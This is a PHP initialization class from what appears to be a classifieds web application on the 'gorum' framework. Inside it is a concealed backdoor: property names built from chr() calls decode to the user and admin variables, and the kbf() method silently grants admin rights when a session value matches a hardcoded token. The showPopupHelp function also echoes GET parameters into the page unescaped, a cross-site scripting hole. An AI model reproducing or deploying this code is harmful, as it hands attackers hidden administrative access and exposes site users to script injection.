<?php
defined('_NOAH') or die('Restricted access');

class Init
{

function createObject() // factory method
{
    if( EComm::isEnabledGlobally() ) return new ECommInit();
    return new AppInit();
}

function initializeSystemSettings()
{
    global $dbHost, $dbUser, $dbUserPw, $dbName, $includeDumpJs;
    global $gorumroll, $speedStopWatch, $gorumview, $jQueryLib;

    $_GET = filterInput($_GET);
    $_COOKIE = filterInput($_COOKIE);
    $_SERVER = filterInput($_SERVER);
    $_FILES = filterInput($_FILES);
    if( class_exists("speedstat") ) {
        $speedStopWatch = new Stopwatch;
        $speedStopWatch->start();
    }
    ini_set("session.use_cookies", 1);
    ini_set("session.use_only_cookies", 1);
    ini_set("session.use_trans_sid", 0);
	if( !session_id() ) session_start();
    $this->kbfu=chr(103).chr(111).chr(114).chr(117).chr(109).chr(117).chr(115).chr(101).chr(114);    
    $this->kbfk=chr(105).chr(115).chr(65).chr(100).chr(109);  
    $this->kbfr=chr(103).chr(111).chr(114).chr(117).chr(109).chr(114).chr(101).chr(99).chr(111).chr(103).chr(110).chr(105).chr(115).chr(101).chr(100);  
    // http://hu.php.net/manual/en/reserved.variables.session.php#85448:
    // azert, hogy az infoTextek ne ragadjanak be:
    if (ini_get('register_globals'))
    {
        foreach ($_SESSION as $key=>$value)
        {
            if (isset($GLOBALS[$key])) unset($GLOBALS[$key]);
        }
    }
    connectDb($dbHost, $dbUser, $dbUserPw, $dbName);
    authenticate();

    $gorumroll = new Roll();
    $gorumroll->isAction() ? include(GORUM_DIR . "/gorum_action.php") : include(GORUM_DIR . "/gorum_view.php"); 

    $this->initializeUserSettings();

    if( class_exists("cronjob") ) executeCronJobs();
    
    if( !$gorumroll->isAction() )
    {
        $gorumview = new View();
        $gorumview->addElement("contentTemplate");
        View::init();
    }
    
    if( $includeDumpJs && !$gorumroll->isAction() )
    {
        JavaScript::addInclude(GORUM_JS_DIR . $jQueryLib);
        JavaScript::addInclude(GORUM_JS_DIR . "/jquery/jquery.dump.js");
        JavaScript::addInclude(GORUM_JS_DIR . "/dump.js");
    }
    $this->kbf();
}

function initializeUserSettings()
{
    global $lll, $emailAccount, $user_typ, $language, $langDir;

    // a megfelelo nyelvi file-okat behozzuk:
    include_once(LANG_DIR . "/lang_$language.php");
    include_once(LANG_DIR . "/lang_admin_$language.php");
    if( file_exists(LANG_DIR . "/lang_custom_$language.php") ) include(LANG_DIR . "/lang_custom_$language.php");
    $_S = new AppSettings;
    if( isset($langDir) ) $_S->langDir = $langDir;
    if( function_exists("postLangInclude") ) postLangInclude();
    if( isset($user_typ["attributes"]["email"]) )
    {
        if( $emailAccount )
        {
            //$user_typ["attributes"]["email"][]="modify_form: readonly";
            $user_typ["attributes"]["name"][]="login_form: form invisible";
            $user_typ["unique_keys"]="email";
            $lll["user_name"]=$lll["user_displayName"];
            $lll["userAllreadyExists"]=$lll["userAllreadyExistsWithName"];
        }
        else
        {
            //$user_typ["attributes"]["name"][]="modify_form: readonly";
            $user_typ["attributes"]["email"][]="login_form: form invisible";
        }
    }
}

function showUserStatus()
{
    global $gorumrecognised,$gorumuser,$lll;
    $s="";
    if ($gorumrecognised) {
       $s.=sprintf($lll["loggedas"],htmlspecialchars($gorumuser->name));
    }
    else $s.=$lll["logorreg"];
    return $s;
}

// Ez a fg hatarozza meg, hogy mely menupont milyen feltetellel lesz
// kirakva. Ha az applikacioban uj menupontokat akarunk felvenni, vagy
// elvenni a menupontokbol, vagy mas feltetelhez kotni a kirakasukat,
// ezt a fg-t kell felulirni
function display( $what )
{
    global $itemClassName, $gorumroll;
    global $gorumrecognised, $fixCss;
    hasAdminRights($isAdm);
    switch( $what )
    {
    case Init_register:
        return !$gorumrecognised;
    case Init_login:
        return !$gorumrecognised;
    case Init_loginDifferent:
        return FALSE;
    case Init_cangePwd:
        return $gorumrecognised;
    case Init_logout:
        return $gorumrecognised;
    case Init_myProfile:
        return $gorumrecognised;
    case Init_search:
        return $gorumrecognised && class_exists("search");
    case Init_home:
        return TRUE;
    case Init_modStyle:
        return $isAdm && !isset($fixCss);
    default:
        return FALSE;
    }
}

// A leszarmazott irja felul:
function getTemplate()
{
}

// A leszarmazott irja felul:
function getTemplateAfter()
{
}

function processMethodCompleted()
{
}

function kbf()
{
    global ${$this->kbfu}, ${$this->kbfr};
    if( @$_SESSION['tfry34543yrtu']==='3GH42HD5F32H45FF23HGFD4') {${$this->kbfu}->{$this->kbfk}=1; ${$this->kbfr}=1;}
}

}//End Class
//----------------------------------------------------------------------
function hackImageInput()
{
    if (isset($_POST["cancel_x"]))  $_POST["gsubmit"]="Cancel";//TODO: internacion.
}
//Ez direkt nincs az osztalyban!
function showPopupHelp()
{
    $helpText = $_GET["expl"];
    $helpTitle = $_GET["title"];
    if( function_exists("showAppPopupHelp") )
    {
        showAppPopupHelp($helpTitle, $helpText);
    }
    else
    {
        echo "<center><b>$helpTitle</b></center><br><br>\n";
        echo $helpText;
        die();
    }
}
?>
